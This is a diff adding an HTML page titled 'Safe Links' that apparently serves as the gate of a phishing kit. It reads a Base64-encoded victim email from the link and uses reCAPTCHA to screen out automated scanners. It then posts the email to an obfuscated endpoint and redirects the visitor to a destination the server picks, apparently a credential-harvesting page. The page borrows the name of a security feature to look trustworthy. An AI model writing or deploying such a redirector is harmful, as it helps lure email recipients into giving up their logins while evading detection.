@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Safe Links</title>
+  <style>
+    .loader, .error-message {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+    }
+    .loader {
+      border: 16px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 16px solid #3498db;
+      width: 120px;
+      height: 120px;
+      animation: spin 2s linear infinite;
+    }
+    .error-message {
+      text-align: center;
+      color: red;
+    }
+    .retry-button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader" id="loader"></div>
+  <div class="error-message" id="error-message">
+    ReCAPTCHA verification failed. Please try again.
+    <button class="retry-button" onclick="retryReCaptcha()">Retry</button>
+  </div>
+
+  <script src="https://www.google.com/recaptcha/api.js?render=6LeqFzYrAAAAAHSQMkmvgDyFKyy4EnzCRKw-P8q9"></script>
+  <script>
+    const RECAPTCHA_SITE_KEY = "6LeqFzYrAAAAAHSQMkmvgDyFKyy4EnzCRKw-P8q9";
+    const RECAPTCHA_ACTION = "LOGIN";
+    const MAX_RETRIES = 3;
+    const RECAPTCHA_VERIFY_URL = "/verify_recaptcha_init";
+    const REDIRECT_URL = "/_0x35adc6";
+
+    async function verifyReCaptcha(emailBase64, retries = MAX_RETRIES) {
+      const loader = document.getElementById("loader");
+      const errorMessage = document.getElementById("error-message");
+
+      loader.style.display = "block";
+      errorMessage.style.display = "none";
+
+      try {
+        const token = await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: RECAPTCHA_ACTION });
+        const response = await fetch(RECAPTCHA_VERIFY_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            Authorization: `Bearer ${token}`,
+          },
+          body: `token=${token}&x=${encodeURIComponent(emailBase64)}`,
+        });
+
+        const result = await response.json();
+        if ((result.status === "success" && result.data) || result.data.score > 0.7) {
+          const t = await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: RECAPTCHA_ACTION });
+          const res = await fetch(REDIRECT_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded",
+              Authorization: `Bearer ${t}`,
+            },
+            body: `token=${t}&x=${encodeURIComponent(emailBase64)}`,
+          });
+
+          const r = await res.json();
+          if (r.status === "success" && r.data) {
+            window.location.href = r.data.i;
+          }
+        } else {
+          throw new Error("ReCAPTCHA verification failed or no redirect url.");
+        }
+      } catch (error) {
+        console.error("An error occurred:", error);
+        if (retries > 0) {
+          setTimeout(() => verifyReCaptcha(emailBase64, retries - 1), 2000);
+        } else {
+          loader.style.display = "none";
+          errorMessage.style.display = "block";
+        }
+      }
+    }
+
+    function retryReCaptcha() {
+      const emailBase64 = new URLSearchParams(window.location.search).get("i");
+      if (emailBase64) {
+        verifyReCaptcha(emailBase64);
+      } else {
+        console.error("The URL does not contain a valid Base64 encoded email.");
+      }
+    }
+
+    window.onload = retryReCaptcha;
+  </script>
+</body>
+</html>
